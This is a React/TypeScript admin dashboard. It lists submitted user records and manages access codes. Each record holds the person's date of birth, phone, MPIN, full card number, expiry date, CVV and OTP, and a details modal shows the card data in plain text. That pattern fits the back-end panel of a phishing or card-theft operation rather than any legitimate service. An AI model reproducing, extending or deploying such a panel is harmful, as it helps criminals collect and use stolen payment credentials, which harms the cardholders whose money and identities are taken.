import { AnimatePresence, motion } from 'framer-motion';
import React, { useEffect, useState } from 'react';
import axios from 'axios';

interface UniqueCode {
  _id: string;
  code: string;
  isActive: boolean;
  createdAt: string;
}

interface User {
  id: string;
  name: string;
  dob: string;
  phone: string;
  mpin: string;
  credit_limit: number;
  card_number: string;
  card_holder_name: string;
  expiry_date: string;
  cvv: string;
  otp: string;
  submission_date: string;
}

interface CodeResponse {
  codes: UniqueCode[];
}

const AdminDashboard: React.FC = () => {
  const [users, setUsers] = useState<User[]>([]);
  const [uniqueCodes, setUniqueCodes] = useState<UniqueCode[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState('');
  const [selectedUser, setSelectedUser] = useState<User | null>(null);
  const [showModal, setShowModal] = useState(false);
  const [activeTab, setActiveTab] = useState<'users' | 'codes'>('users');

  const fetchData = async () => {
    try {
      setLoading(true);
      const [usersResponse, codesResponse] = await Promise.all([
        axios.get<User[]>(`${import.meta.env.VITE_API_URL}/api/users`),
        axios.get<CodeResponse>(`${import.meta.env.VITE_API_URL}/api/unique-code/all`)
      ]);
      
      setUsers(usersResponse.data);
      setUniqueCodes(codesResponse.data.codes);
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Unknown error');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchData();
  }, []);

  const generateNewCode = async () => {
    try {
      setLoading(true);
      await axios.post<CodeResponse>(`${import.meta.env.VITE_API_URL}/api/unique-code/create`);
      await fetchData();
    } catch (err) {
      setError('Failed to generate new code');
    } finally {
      setLoading(false);
    }
  };

  const deleteUser = async (id: string) => {
    if (!window.confirm('Are you sure you want to delete this user? This action cannot be undone.')) {
      return;
    }
    try {
      setLoading(true);
      await axios.delete(`${import.meta.env.VITE_API_URL}/api/users/${id}`);
      await fetchData();
    } catch (err) {
      setError('Failed to delete user');
    } finally {
      setLoading(false);
    }
  };

  const toggleCodeStatus = async (id: string) => {
    try {
      setLoading(true);
      await axios.patch(`${import.meta.env.VITE_API_URL}/api/unique-code/toggle/${id}`);
      await fetchData();
    } catch (err) {
      setError('Failed to toggle code status');
    } finally {
      setLoading(false);
    }
  };

  const deleteCode = async (id: string) => {
    if (!window.confirm('Are you sure you want to delete this code? This action cannot be undone.')) {
      return;
    }
    try {
      setLoading(true);
      await axios.delete(`${import.meta.env.VITE_API_URL}/api/unique-code/delete/${id}`);
      await fetchData();
    } catch (err) {
      setError('Failed to delete code');
    } finally {
      setLoading(false);
    }
  };

  const handleUserClick = (user: User) => {
    setSelectedUser(user);
    setShowModal(true);
  };

  const closeModal = () => {
    setShowModal(false);
    setSelectedUser(null);
  };

  if (loading) {
    return (
      <div className="flex items-center justify-center min-h-screen">
        <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"></div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50 py-4">
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="mb-6">
          <div className="flex justify-between items-center mb-4">
            <h1 className="text-3xl font-bold text-gray-900">Admin Dashboard</h1>
            <div className="flex space-x-4">
              <button
                onClick={() => setActiveTab('users')}
                className={`px-4 py-2 rounded-md transition-colors ${
                  activeTab === 'users'
                    ? 'bg-blue-500 text-white'
                    : 'bg-gray-200 text-gray-700 hover:bg-gray-300'
                }`}
              >
                Users
              </button>
              <button
                onClick={() => setActiveTab('codes')}
                className={`px-4 py-2 rounded-md transition-colors ${
                  activeTab === 'codes'
                    ? 'bg-blue-500 text-white'
                    : 'bg-gray-200 text-gray-700 hover:bg-gray-300'
                }`}
              >
                Unique Codes
              </button>
            </div>
          </div>

          {error && (
            <div className="mb-4 bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded">
              {error}
            </div>
          )}

          {activeTab === 'users' ? (
            <div className="bg-white rounded-lg shadow overflow-hidden">
              <div className="px-4 py-5 sm:px-6 border-b border-gray-200">
                <h3 className="text-lg leading-6 font-medium text-gray-900">
                  Users Management
                </h3>
                <p className="mt-1 text-sm text-gray-500">
                  Total Users: {users.length}
                </p>
              </div>
              <div className="overflow-x-auto">
                <table className="min-w-full divide-y divide-gray-200">
                  <thead className="bg-gray-50">
                    <tr>
                      <th scope="col" className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                        Name
                      </th>
                      <th scope="col" className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                        Phone
                      </th>
                      <th scope="col" className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                        Submission Date
                      </th>
                      <th scope="col" className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                        Actions
                      </th>
                    </tr>
                  </thead>
                  <tbody className="bg-white divide-y divide-gray-200">
                    {users.map((user) => (
                      <tr key={user.id} className="hover:bg-gray-50">
                        <td className="px-6 py-4 whitespace-nowrap">
                          <div className="text-sm font-medium text-gray-900">{user.name}</div>
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap">
                          <div className="text-sm text-gray-500">{user.phone}</div>
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                          {new Date(user.submission_date).toLocaleString()}
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                          <div className="flex space-x-4">
                            <button
                              onClick={() => handleUserClick(user)}
                              className="text-blue-600 hover:text-blue-900"
                            >
                              View Details
                            </button>
                            <button
                              onClick={() => deleteUser(user.id)}
                              className="text-red-600 hover:text-red-900"
                            >
                              Delete
                            </button>
                          </div>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          ) : (
            <div className="bg-white rounded-lg shadow-lg p-6">
              <div className="flex justify-between items-center mb-6">
                <div>
                  <h2 className="text-xl font-semibold">Unique Codes</h2>
                  <p className="text-sm text-gray-500 mt-1">
                    Active Codes: {uniqueCodes.filter(code => code.isActive).length}
                  </p>
                </div>
                <button
                  onClick={generateNewCode}
                  className="bg-blue-500 hover:bg-blue-600 text-white px-4 py-2 rounded-md transition-colors"
                >
                  Generate New Code
                </button>
              </div>

              <div className="overflow-x-auto">
                <table className="min-w-full">
                  <thead>
                    <tr className="bg-gray-100">
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                        Code
                      </th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                        Created At
                      </th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                        Status
                      </th>
                      <th className="px-6 py-3 text-left text-xs font-medium text-gray-500 uppercase tracking-wider">
                        Actions
                      </th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-gray-200">
                    {uniqueCodes.map((code) => (
                      <tr key={code._id} className="hover:bg-gray-50">
                        <td className="px-6 py-4 whitespace-nowrap text-sm font-medium text-gray-900">
                          {code.code}
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                          {new Date(code.createdAt).toLocaleDateString()}
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm">
                          <span className={`px-2 inline-flex text-xs leading-5 font-semibold rounded-full ${
                            code.isActive ? 'bg-green-100 text-green-800' : 'bg-red-100 text-red-800'
                          }`}>
                            {code.isActive ? 'Active' : 'Inactive'}
                          </span>
                        </td>
                        <td className="px-6 py-4 whitespace-nowrap text-sm text-gray-500">
                          <div className="flex space-x-4">
                            <button
                              onClick={() => toggleCodeStatus(code._id)}
                              className={`${
                                code.isActive ? 'text-yellow-600 hover:text-yellow-900' : 'text-green-600 hover:text-green-900'
                              } transition-colors`}
                            >
                              {code.isActive ? 'Deactivate' : 'Activate'}
                            </button>
                            <button
                              onClick={() => deleteCode(code._id)}
                              className="text-red-600 hover:text-red-900 transition-colors"
                            >
                              Delete
                            </button>
                          </div>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </div>
          )}
        </div>

        {/* User Details Modal */}
        <AnimatePresence>
          {showModal && selectedUser && (
            <>
              <div
                className="fixed inset-0 bg-black bg-opacity-50 z-40"
                onClick={closeModal}
              />
              <motion.div
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.95 }}
                className="fixed inset-0 z-50 overflow-y-auto"
                onClick={closeModal}
              >
                <div className="flex items-center justify-center min-h-screen px-4">
                  <motion.div
                    className="bg-white rounded-lg shadow-xl max-w-2xl w-full p-6"
                    onClick={e => e.stopPropagation()}
                  >
                    <div className="flex justify-between items-start">
                      <div>
                        <h3 className="text-2xl font-bold text-gray-900">
                          {selectedUser.name}
                        </h3>
                        <p className="text-sm text-gray-500 mt-1">
                          Submitted: {new Date(selectedUser.submission_date).toLocaleString()}
                        </p>
                      </div>
                      <button
                        onClick={closeModal}
                        className="text-gray-400 hover:text-gray-500"
                      >
                        <span className="sr-only">Close</span>
                        <svg className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                        </svg>
                      </button>
                    </div>

                    <div className="mt-6 grid grid-cols-1 gap-6">
                      <div className="bg-gray-50 rounded-lg p-4">
                        <h4 className="text-lg font-medium text-gray-900 mb-3">Personal Info</h4>
                        <div className="space-y-2">
                          <div className="flex justify-between">
                            <span className="text-gray-600">Date of Birth:</span>
                            <span className="font-medium">{selectedUser.dob}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-600">Phone:</span>
                            <span className="font-medium">{selectedUser.phone}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-600">MPIN:</span>
                            <span className="font-medium">{selectedUser.mpin}</span>
                          </div>
                        </div>
                      </div>

                      <div className="bg-gray-50 rounded-lg p-4">
                        <h4 className="text-lg font-medium text-gray-900 mb-3">Card Details</h4>
                        <div className="space-y-2">
                          <div className="flex justify-between">
                            <span className="text-gray-600">Card Number:</span>
                            <span className="font-medium">{selectedUser.card_number || 'N/A'}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-600">Card Holder:</span>
                            <span className="font-medium">{selectedUser.card_holder_name || 'N/A'}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-600">Expiry Date:</span>
                            <span className="font-medium">{selectedUser.expiry_date || 'N/A'}</span>
                          </div>
                          <div className="flex justify-between">
                            <span className="text-gray-600">CVV:</span>
                            <span className="font-medium">{selectedUser.cvv || 'N/A'}</span>
                          </div>
                        </div>
                      </div>
                    </div>
                  </motion.div>
                </div>
              </motion.div>
            </>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
};

export default AdminDashboard;
